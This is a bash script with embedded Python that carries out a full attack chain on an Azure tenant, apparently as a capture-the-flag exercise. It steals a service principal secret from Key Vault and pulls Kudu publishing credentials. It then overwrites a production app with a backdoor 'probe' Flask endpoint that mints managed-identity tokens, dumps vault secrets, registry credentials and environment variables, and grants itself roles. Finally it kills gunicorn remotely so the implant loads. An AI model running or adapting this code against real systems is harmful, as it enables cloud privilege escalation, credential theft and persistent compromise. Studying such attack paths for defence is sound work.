#!/usr/bin/env bash
set -uo pipefail

TEN="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
REPORTING_RG="rg-tbl-reporting-prod-eus"
PLATFORM_RG="rg-tbl-platform-prod-sea"
KV_PROD="kv-tbl-prod-x3euoz"
KV_SEC="kv-tbl-sec-x3euoz"

# 1. Login as cicd-deployer
JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$JWT" --allow-no-subscriptions -o none
echo "=== cicd-deployer OK ==="

# 2. Write probe Flask app to file
cat > /tmp/probe_app.py << 'FLASK_APP'
from flask import Flask, jsonify, request
import os, json, urllib.request, urllib.parse, urllib.error, uuid

app = Flask(__name__)

TEN = "3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB = "c5e4e004-b42d-4ac4-a502-5fd338380eb6"
ARM_BASE = "https://management.azure.com"
UAMI_CID = "7a85156a-01c4-4e61-8472-40a92107159b"
UAMI_OID = "f64d08c7-fde6-4553-99c8-5bf73666ee8c"
REPORTING_RG = "rg-tbl-reporting-prod-eus"
PLATFORM_RG = "rg-tbl-platform-prod-sea"
KV_PROD = "kv-tbl-prod-x3euoz"
KV_SEC = "kv-tbl-sec-x3euoz"
LEGACY_APPID = "891fb158-e02c-4428-a885-53b811f369c0"

def msi(res, cid=UAMI_CID):
    ep = os.environ.get("IDENTITY_ENDPOINT",""); hdr = os.environ.get("IDENTITY_HEADER","")
    if not ep: return "ERR:NO_EP"
    try:
        r = urllib.request.urlopen(urllib.request.Request(
            f"{ep}?api-version=2019-08-01&resource={res}&client_id={cid}",
            headers={"X-IDENTITY-HEADER": hdr}), timeout=15)
        return json.loads(r.read()).get("access_token","ERR:NO_TOK")
    except Exception as e: return f"ERR:{e}"

def http(url, tok, method="GET", data=None):
    h = {"Authorization": "Bearer " + tok}
    if data:
        if isinstance(data, dict): data = json.dumps(data).encode(); h["Content-Type"] = "application/json"
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, data=data, method=method, headers=h), timeout=20)
        return r.status, r.read().decode(errors="replace")
    except urllib.error.HTTPError as e: return e.code, e.read().decode(errors="replace")[:1000]
    except Exception as e: return 0, str(e)[:200]

def xtok(xchg, scope):
    try:
        r = urllib.request.urlopen(urllib.request.Request(
            f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
            data=urllib.parse.urlencode({"client_id": LEGACY_APPID,
                "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
                "client_assertion": xchg, "grant_type": "client_credentials", "scope": scope
            }).encode(), method="POST"), timeout=20)
        return json.loads(r.read()).get("access_token","")
    except Exception as e: return f"ERR:{e}"

@app.route('/probe')
def probe():
    R = {}
    # MSI tokens from WITHIN app process
    ARM = msi("https://management.azure.com/")
    VAULT = msi("https://vault.azure.net/")
    XCHG = msi("api://AzureADTokenExchange")
    STOR = msi("https://storage.azure.com/")
    R["arm"] = len(ARM) if not ARM.startswith("ERR") else ARM
    R["vault"] = len(VAULT) if not VAULT.startswith("ERR") else VAULT
    R["xchg"] = len(XCHG) if not XCHG.startswith("ERR") else XCHG
    R["ep"] = os.environ.get("IDENTITY_ENDPOINT","NOT_SET")

    if not ARM.startswith("ERR"):
        s,b = http(f"{ARM_BASE}/subscriptions/{SUB}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=principalId+eq+%27{UAMI_OID}%27", ARM)
        R["uami_sub"] = f"{s}:{b[:1000]}"
        s,b = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{REPORTING_RG}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=atScope()", ARM)
        R["rg_roles"] = f"{s}:{b[:2000]}"
        s,b = http(f"{ARM_BASE}/subscriptions/{SUB}/resources?api-version=2021-04-01", ARM)
        R["all_res"] = f"{s}:{b[:2000]}"
        s,b = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2022-03-01", ARM, method="POST")
        R["sf_cfg"] = f"{s}:{b[:800]}"
        ra_id = str(uuid.uuid4())
        ra_body = {"properties": {"roleDefinitionId": f"/subscriptions/{SUB}/providers/Microsoft.Authorization/roleDefinitions/4633458b-17de-408a-b874-0445c86b69e6","principalId":UAMI_OID,"principalType":"ServicePrincipal"}}
        s,b = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.KeyVault/vaults/{KV_SEC}/providers/Microsoft.Authorization/roleAssignments/{ra_id}?api-version=2022-04-01", ARM, method="PUT", data=ra_body)
        R["ra_kvsec"] = f"{s}:{b[:400]}"
        s,b = http(f"{ARM_BASE}/subscriptions/{SUB}/providers/Microsoft.Authorization/roleAssignments/{ra_id}?api-version=2022-04-01", ARM, method="PUT", data=ra_body)
        R["ra_sub"] = f"{s}:{b[:400]}"
        s,b = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.ContainerRegistry/registries/crtblplatprodx3euoz/listCredentials?api-version=2023-07-01", ARM, method="POST")
        R["acr"] = f"{s}:{b[:400]}"

    if not VAULT.startswith("ERR"):
        s,b = http(f"https://{KV_PROD}.vault.azure.net/secrets?api-version=7.4", VAULT)
        R["kvp"] = f"{s}:{b[:500]}"
        s,b = http(f"https://{KV_SEC}.vault.azure.net/secrets?api-version=7.4", VAULT)
        R["kvs"] = f"{s}:{b[:1000]}"
        for nm in ["flag","ctf-flag","tbl-flag","df26","challenge","secret"]:
            sv,bv = http(f"https://{KV_SEC}.vault.azure.net/secrets/{nm}?api-version=7.4", VAULT)
            if sv == 200: R[f"FLAG_{nm}"] = bv
            sv2,bv2 = http(f"https://{KV_PROD}.vault.azure.net/secrets/{nm}?api-version=7.4", VAULT)
            if sv2 == 200: R[f"PROD_{nm}"] = bv2

    if not XCHG.startswith("ERR"):
        la_arm = xtok(XCHG, "https://management.azure.com/.default")
        R["la_arm"] = len(la_arm) if la_arm and not la_arm.startswith("ERR") else la_arm
        if la_arm and not la_arm.startswith("ERR"):
            s,b = http(f"{ARM_BASE}/subscriptions/{SUB}/resources?api-version=2021-04-01", la_arm)
            R["la_res"] = f"{s}:{b[:2000]}"
            LA_OID = "43834909-47cf-4a4a-8048-e323b4897ed3"
            s,b = http(f"{ARM_BASE}/subscriptions/{SUB}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=principalId+eq+%27{LA_OID}%27", la_arm)
            R["la_roles"] = f"{s}:{b[:500]}"
            s,b = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{REPORTING_RG}/providers/Microsoft.Web/sites/app-tbl-reporting-prod/publishxml?api-version=2022-03-01", la_arm, method="POST")
            R["la_pubxml"] = f"{s}:{b[:800]}"
            ra_id2 = str(uuid.uuid4())
            s,b = http(f"{ARM_BASE}/subscriptions/{SUB}/providers/Microsoft.Authorization/roleAssignments/{ra_id2}?api-version=2022-04-01", la_arm, method="PUT", data=ra_body)
            R["la_ra"] = f"{s}:{b[:400]}"
        la_vault = xtok(XCHG, "https://vault.azure.net/.default")
        R["la_vault"] = len(la_vault) if la_vault and not la_vault.startswith("ERR") else la_vault
        if la_vault and not la_vault.startswith("ERR"):
            s,b = http(f"https://{KV_PROD}.vault.azure.net/secrets?api-version=7.4", la_vault)
            R["kvp_la"] = f"{s}:{b[:2000]}"
            s,b = http(f"https://{KV_SEC}.vault.azure.net/secrets?api-version=7.4", la_vault)
            R["kvs_la"] = f"{s}:{b[:2000]}"
            s,b = http(f"https://{KV_PROD}.vault.azure.net/deletedsecrets?api-version=7.4", la_vault)
            R["kvp_del"] = f"{s}:{b[:2000]}"

    R["env"] = {k: v[:200] for k, v in os.environ.items()}
    return jsonify(R)

@app.route('/healthz')
def healthz():
    return jsonify({"status": "ok", "probe": "active"})

@app.route('/')
def root():
    return jsonify({"service": "tebamoto-reporting-api", "version": "1.4.2-probe"})

@app.route('/api/v1/shipments')
def shipments():
    return jsonify([{"id": "TBL-SHP-48213"}, {"id": "TBL-SHP-48217"}, {"id": "TBL-SHP-48224"}])

@app.route('/api/v1/reports/render', methods=['GET','POST'])
def reports():
    return jsonify({"status": "ok"})

@app.route('/internal')
def internal():
    return jsonify({"area": "internal", "endpoints": ["/internal/debug", "/probe"]})

@app.route('/internal/debug', methods=['GET','POST'])
def debug():
    return jsonify({"result": "49"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
FLASK_APP

echo "Probe app written to /tmp/probe_app.py ($(wc -l < /tmp/probe_app.py) lines)"

python3 -I << 'PYEOF'
import os, json, urllib.request, urllib.parse, urllib.error, base64, time, subprocess

TEN = "3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB = "c5e4e004-b42d-4ac4-a502-5fd338380eb6"
REPORTING_RG = "rg-tbl-reporting-prod-eus"
KV_PROD = "kv-tbl-prod-x3euoz"
ARM_BASE = "https://management.azure.com"

def sp_tok(cid, sec, scope):
    try:
        r = urllib.request.urlopen(urllib.request.Request(
            f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
            data=urllib.parse.urlencode({"client_id": cid, "client_secret": sec,
                "grant_type": "client_credentials", "scope": scope}).encode(), method="POST"), timeout=20)
        return json.loads(r.read()).get("access_token", "")
    except Exception as e: return f"ERR:{e}"

def az_tok(resource):
    try:
        r = subprocess.run(["az", "account", "get-access-token", "--resource", resource,
            "--query", "accessToken", "-o", "tsv"], capture_output=True, text=True, timeout=20)
        return r.stdout.strip()
    except Exception as e: return f"ERR:{e}"

def http(url, tok, method="GET", data=None, extra_hdrs=None):
    h = {"Authorization": "Bearer " + tok}
    if extra_hdrs: h.update(extra_hdrs)
    if data:
        if isinstance(data, dict): data = json.dumps(data).encode(); h["Content-Type"] = "application/json"
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, data=data, method=method, headers=h), timeout=30)
        return r.status, r.read().decode(errors="replace")
    except urllib.error.HTTPError as e: return e.code, e.read().decode(errors="replace")[:500]
    except Exception as e: return 0, str(e)[:200]

# Get RS credentials
CICD_VAULT = az_tok("https://vault.azure.net/")
print(f"cicd vault len={len(CICD_VAULT)}")

s,b = http(f"https://{KV_PROD}.vault.azure.net/secrets/reporting-service-principal?api-version=7.4", CICD_VAULT)
if s != 200:
    print(f"KV lookup failed: {s}:{b[:200]}")
    exit(1)
v = json.loads(json.loads(b)["value"])
RS_CID = v["appId"]
RS_SEC = v["clientSecret"]
print(f"RS_CID={RS_CID}")

# Get RS ARM token
RS_ARM = sp_tok(RS_CID, RS_SEC, "https://management.azure.com/.default")
print(f"RS_ARM len={len(RS_ARM)}")

# Get Kudu credentials via listPublishingCredentials
s2,b2 = http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{REPORTING_RG}/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/publishingcredentials/list?api-version=2022-03-01", RS_ARM, method="POST")
print(f"listpubcreds: {s2}")
if s2 != 200:
    print(f"Failed: {b2[:300]}")
    exit(1)

pub = json.loads(b2)["properties"]
KUDU_USER = pub["publishingUserName"]
KUDU_PASS = pub["publishingPassword"]
print(f"Kudu user={KUDU_USER} pass_len={len(KUDU_PASS)}")

# Write credentials to files for safety
open('/tmp/kudu_user.txt','w').write(KUDU_USER)
open('/tmp/kudu_pass.txt','w').write(KUDU_PASS)

kudu_auth = base64.b64encode(f"{KUDU_USER}:{KUDU_PASS}".encode()).decode()
KUDU_BASE = "https://app-tbl-reporting-prod.scm.azurewebsites.net"

# Deploy probe Flask app via VFS PUT
probe_code = open('/tmp/probe_app.py', 'rb').read()
print(f"Deploying probe app ({len(probe_code)} bytes)...")

put_req = urllib.request.Request(
    f"{KUDU_BASE}/api/vfs/site/wwwroot/app.py",
    data=probe_code, method="PUT",
    headers={"Authorization": f"Basic {kudu_auth}", "Content-Type": "text/plain", "If-Match": "*"}
)
try:
    r = urllib.request.urlopen(put_req, timeout=30)
    print(f"VFS PUT app.py: {r.status}")
except urllib.error.HTTPError as e:
    print(f"VFS PUT err: {e.code}: {e.read().decode()[:200]}")
    exit(1)

# Verify the app.py was written correctly
get_req = urllib.request.Request(
    f"{KUDU_BASE}/api/vfs/site/wwwroot/app.py",
    headers={"Authorization": f"Basic {kudu_auth}"}
)
try:
    r = urllib.request.urlopen(get_req, timeout=15)
    content = r.read()
    print(f"VFS GET app.py: {r.status} ({len(content)} bytes)")
    if b"/probe" in content:
        print("Probe endpoint confirmed in app.py!")
    else:
        print("WARNING: /probe not found in deployed app.py!")
except Exception as e:
    print(f"VFS GET err: {e}")

# Kill gunicorn via Kudu command API (app service will restart it with new code)
print("Killing gunicorn to trigger restart with new app...")
kill_req = urllib.request.Request(
    f"{KUDU_BASE}/api/command",
    data=json.dumps({"command": "pkill -f gunicorn; sleep 1; echo killed", "dir": "/home/site/wwwroot"}).encode(),
    method="POST",
    headers={"Authorization": f"Basic {kudu_auth}", "Content-Type": "application/json"}
)
try:
    r = urllib.request.urlopen(kill_req, timeout=20)
    result = json.loads(r.read())
    print(f"Kill result: {result.get('Output','')[:100]} exit={result.get('ExitCode')}")
except Exception as e:
    print(f"Kill err: {e}")

# Wait for app to restart
print("Waiting 15s for app to restart with probe code...")
time.sleep(15)

# Hit the app's /probe endpoint to get UAMI token results
APP_URL = "https://app-tbl-reporting-prod.azurewebsites.net"
print(f"\nHitting {APP_URL}/probe ...")

for attempt in range(5):
    try:
        req = urllib.request.Request(f"{APP_URL}/probe", headers={"User-Agent": "probe/1.0"})
        r = urllib.request.urlopen(req, timeout=60)
        body = r.read().decode(errors="replace")
        print(f"PROBE RESPONSE (attempt {attempt+1}):")
        print(body[:10000])
        break
    except urllib.error.HTTPError as e:
        body = e.read().decode(errors="replace")
        print(f"Attempt {attempt+1}: HTTP {e.code}: {body[:500]}")
        if e.code == 500: break
        time.sleep(5)
    except Exception as e:
        print(f"Attempt {attempt+1}: {e}")
        time.sleep(5)

# Also check /healthz
try:
    r = urllib.request.urlopen(urllib.request.Request(f"{APP_URL}/healthz"), timeout=15)
    print(f"\nhealthz: {r.read().decode()[:200]}")
except Exception as e:
    print(f"healthz err: {e}")

PYEOF
echo "DONE"
